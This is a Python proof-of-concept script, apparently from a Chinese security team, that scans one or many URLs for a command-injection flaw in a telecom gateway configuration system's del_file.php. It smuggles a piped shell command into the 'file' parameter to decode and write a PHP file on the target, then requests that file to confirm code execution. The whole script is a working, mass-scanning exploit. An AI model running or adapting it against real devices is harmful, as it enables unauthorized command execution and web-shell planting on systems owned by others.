#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : 浅梦安全
import requests
import random
import string
import argparse
from urllib3.exceptions import InsecureRequestWarning

RED = '\033[91m'
RESET = '\033[0m'
# 忽略不安全请求的警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def rand_base(n):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def check_vulnerability(url):
    filename = rand_base(6)
    # 第一个请求：注入恶意代码并生成PHP文件
    inject_url = url.rstrip('/') + f'/manager/newtpl/del_file.php?file=1.txt%7Cecho%20PD9waHAgZWNobyBtZDUoJzEyMzQ1NicpO3VubGluayhfX0ZJTEVfXyk7Pz4%3D%20%7C%20base64%20-d%20%3E%20{filename}.php'
    
    try:
        response_inject = requests.get(inject_url, verify=False, timeout=30)
        # print(f'Inject Response Status Code: {response_inject.status_code}')

        # 第二个请求：访问生成的PHP文件
        access_url = url.rstrip('/') + f'/manager/newtpl/{filename}.php'
        response_access = requests.get(access_url, verify=False, timeout=30)
        # print(f'Access Response Status Code: {response_access.status_code}')
        # print(f'Access Response Body: {response_access.text}')

        if response_inject.status_code == 200 and response_access.status_code == 200 and "e10adc3949ba59abbe56e057f20f883e" in response_access.text:
            print(f"{RED}URL [{url}] 存在电信网关配置管理系统 del_file.php 命令执行漏洞{RESET}")
        else:
            print(f"URL [{url}] 不存在漏洞")
    except requests.exceptions.Timeout:
        print(f"URL [{url}] 请求超时，可能存在漏洞")
    except requests.RequestException as e:
        print(f"URL [{url}] 请求失败: {e}")

def main():
    parser = argparse.ArgumentParser(description='检测目标地址是否存在电信网关配置管理系统 del_file.php 命令执行漏洞')
    parser.add_argument('-u', '--url', help='指定目标地址')
    parser.add_argument('-f', '--file', help='指定包含目标地址的文本文件')

    args = parser.parse_args()

    if args.url:
        if not args.url.startswith("http://") and not args.url.startswith("https://"):
            args.url = "http://" + args.url
        check_vulnerability(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "http://" + url
                check_vulnerability(url)

if __name__ == '__main__':
    main()
